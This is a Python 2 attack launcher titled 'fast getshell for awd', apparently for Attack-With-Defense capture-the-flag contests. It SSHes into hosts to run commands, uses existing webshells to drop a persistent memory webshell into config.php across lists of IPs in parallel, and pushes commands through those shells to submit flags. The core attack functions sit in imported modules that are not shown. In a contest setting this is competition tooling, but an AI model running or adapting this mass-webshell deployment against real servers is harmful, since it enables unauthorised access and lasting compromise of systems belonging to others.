#coding:utf-8
# author : p0desta

import requests
import paramiko
import threading
import  time
import argparse
from module.sshlogin import *
from module.memoryup import *
from module.command import *
ip_success = []

describe = '''
    ___        ______
   / \ \      / /  _ \\
  / _ \ \ /\ / /| | | |
 / ___ \ V  V / | |_| |
/_/   \_\_/\_/  |____/                   author: p0desta\n

'''
print describe
parser = argparse.ArgumentParser(description='fast getshell for awd')
parser.add_argument("--mode",help='''****************Choose an attack mode****************
        ***************ssh:   login and command ***************
        ****upload:   use webshell to upload memory shell *****
        ************submit:   automatic submit flag ************''',required=True)
parser.add_argument("--ip",help="please input ip or op iplist",required=True)
parser.add_argument("--path",help="please input your paths,example:index.php",default="/index.php")
parser.add_argument("--passwd",help="please input your webshell password",default="cmd")
parser.add_argument("--localshell",help="please input your memory webshell add",default="p0desta.php")
parser.add_argument("--port",help="please input port",default="80")
parser.add_argument("--command",help="please input your command use your webshell",default="p0desta.top")

args = parser.parse_args()
if args.mode == "ssh":
    ssh_execmd(args)
elif args.mode == "upload":
    iplist = split(args.ip)
    php = open(args.localshell,"r").read()
    for i in iplist:
        a = threading.Thread(target=make_sudo, args=("http://" + i + args.path, args.passwd,"http://" + i + "/config.php",php))
        a.start()
elif args.mode == "submit":
    p = raw_input("submit or test? (1 or 0):")
    iplist = split(args.ip)
    for i in iplist:
        a = threading.Thread(target=do_command,args=("http://"+ i + args.path,args.passwd,args.command,p))
        a.start()





